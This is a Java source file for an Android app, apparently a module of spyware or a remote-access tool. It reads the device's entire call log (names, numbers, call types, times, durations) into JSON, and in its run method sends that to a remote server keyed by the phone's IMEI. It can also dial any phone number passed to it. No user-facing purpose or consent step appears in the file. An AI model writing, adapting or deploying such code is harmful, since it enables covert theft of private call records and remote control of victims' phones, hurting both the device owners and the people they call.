package com.phone.data;



import com.authority.AuthoritySettings;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import org.json.JSONArray;
import org.json.JSONObject;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;




public class PhoneCall implements Runnable{
	private static final String TAG = "PhoneCall";
	private Context context;
	private String phoneNo = null;
	
	
	public PhoneCall(Context context, String phone){
		this.context = context;
		this.phoneNo = phone;
	}
	
	public PhoneCall(Context context){
		this.context = context;
	}
	
    public static String getCallHistoryList(Context context){
		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.READ_CALL_LOG) == false){
			return "";
		}
    	
    	JSONArray jsarray = new JSONArray();
    	
    	try{
			ContentResolver cr = context.getContentResolver();
	
	       Cursor cs=cr.query(CallLog.Calls.CONTENT_URI, 
	              new String[]{CallLog.Calls.CACHED_NAME,  
	                         CallLog.Calls.NUMBER,   
	                         CallLog.Calls.TYPE,  
	                         CallLog.Calls.DATE,  
	                         CallLog.Calls.DURATION         
	                         },null,null,CallLog.Calls.DEFAULT_SORT_ORDER);
	       
	       int i=0;
	       if(cs!=null &&cs.getCount()>0){
	           for(cs.moveToFirst();!cs.isAfterLast() ; cs.moveToNext()){
	              String callName=cs.getString(0);
	              String callNumber=cs.getString(1);

	              int callType=Integer.parseInt(cs.getString(2));
	              String callTypeStr="";
	              switch (callType) {
	              case CallLog.Calls.INCOMING_TYPE:
	                  callTypeStr="呼入";
	                  break;
	              case CallLog.Calls.OUTGOING_TYPE:
	                  callTypeStr="呼出";
	                  break;
	              case CallLog.Calls.MISSED_TYPE:
	                  callTypeStr="未接";
	                  break;
	                  /** Call log type for voicemails. */
	              case CallLog.Calls.VOICEMAIL_TYPE:
	                  callTypeStr="voiceMail";
	                  break;
	                  
	              case 10:				//vivo
	                  callTypeStr="未接";
	                  break;    
	              default:
	                  callTypeStr="未知";
	                  break;
	              }

	              String callDateStr = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss",Long.parseLong(cs.getString(3)));
	              String callDurationStr = cs.getString(4);
	              if(callDurationStr == null){
	            	  callDurationStr = "0分0秒";
	              }else{
		              int callDuration=Integer.parseInt(callDurationStr);
		              int min=callDuration/60;
		              int sec=callDuration%60;
		              callDurationStr=min+"分"+sec+"秒";
	              }
	              
	              JSONObject jsobj=new JSONObject();
	    	   	  jsobj.put("类型", callTypeStr);
	    	   	  jsobj.put("姓名", callName);
	    	   	  jsobj.put("号码", callNumber);
	    	   	  jsobj.put("时间", callDateStr);
	    	   	  jsobj.put("时长", callDurationStr);
	    	   	  
	    	   	  jsarray.put(i,jsobj);

	              i++;
	           }
	           cs.close();
	       }
    	}catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("UserPhoneCall exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
    	}
      
    	return jsarray.toString();
    }
    
    

    


	public static void callPhoneNumber(Context context,String phoneNumber) {
		try{
			if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.CALL_PHONE) == false){
				return;
			}
			
			Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phoneNumber));
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		    context.startActivity(intent);
		    Log.e(TAG, "call phone:" + phoneNumber + " ok");
		    WriteDateFile.writeLogFile("call phone:" + phoneNumber + " ok\r\n");
		}
		catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("callPhoneNumber exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
	}

	
	public void run(){
		
		if (phoneNo == null) {
			String call = getCallHistoryList(context);
			if(call != null && call.equals("") == false){
				SendDataToServer.sendDataToServer(call.getBytes(), call.getBytes().length,
						Public.CMD_DATA_MESSAGE, Public.IMEI);
			}
		}else{
			callPhoneNumber(context, phoneNo);
		}
	}
 
    
}

